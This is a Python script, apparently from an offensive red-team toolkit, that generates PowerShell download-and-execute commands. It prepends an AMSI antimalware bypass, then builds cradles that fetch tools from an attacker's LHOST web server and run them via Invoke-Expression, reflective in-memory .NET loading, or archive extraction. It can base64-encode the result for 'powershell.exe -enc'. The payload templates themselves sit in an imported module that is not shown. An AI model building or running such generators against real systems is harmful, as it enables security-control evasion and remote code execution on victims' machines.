#!/bin/env python3
import ak
import argparse
import base64
import os
import sys
import yaml

# Tool type:
# Reflective EXE - load and execute
# Powershell - execute
# Normal exe - dl and run
# Archive - dl and extract

def b64_encode(s):
  b64_encoded = base64.b64encode(s.encode('utf-16le'))
  b64_str = b64_encoded.decode("utf-8")
  return b64_str


def main():
  parser = argparse.ArgumentParser()
  parser.add_argument('--amsi', default=True, action=argparse.BooleanOptionalAction)
  parser.add_argument('--base64', '-b', action=argparse.BooleanOptionalAction)
  parser.add_argument('tool', choices=ak.conf['tools'].keys())

  args = parser.parse_args()

  tool = args.tool
  tool_conf = ak.conf['tools'][tool]
  tool_type = ak.conf['tools'][tool]['type']
  tool_location = ak.conf['tools'][tool]['location']

  if not os.path.exists(ak.WEBROOT + "/" + tool_location):
    print("WARNING: Tool not found at: " + ak.WEBROOT + "/" + tool_location + "\r\n")

  s = ""

  if args.amsi:
    s += ak.PS_AMSI + ';'

  if tool_type == 'ps':
    s += ak.PS_IEX_WEBCLIENT.format(LHOST=ak.LHOST, tool=tool_location)

    if 'invoke' in tool_conf.keys():
      s += ';' + tool_conf['invoke']


  elif tool_type == 'cs':
    tool_class = tool_conf['class']
    tool_entrypoint = tool_conf['entrypoint']
    s += ak.PS_REFLECTIVE_WEBCLIENT.format(LHOST=ak.LHOST, tool=tool_location, tool_class=tool_class, entrypoint=tool_entrypoint )
  elif tool_type == 'zip':
    s += ak.PS_UNZIP_CMD.format(LHOST=ak.LHOST, tool=tool_location)
  else:
    print(f"Invalid type {tool_type} for command {tool}")
    sys.exit(1)

  if 'method' in tool_conf.keys():
    s+= ';' + tool_conf['method']

  if args.base64:
    s = b64_encode(s)
    print("Run with: powershell.exe -enc "+s)
  else:
    print(s)

if __name__ == "__main__":
  main()
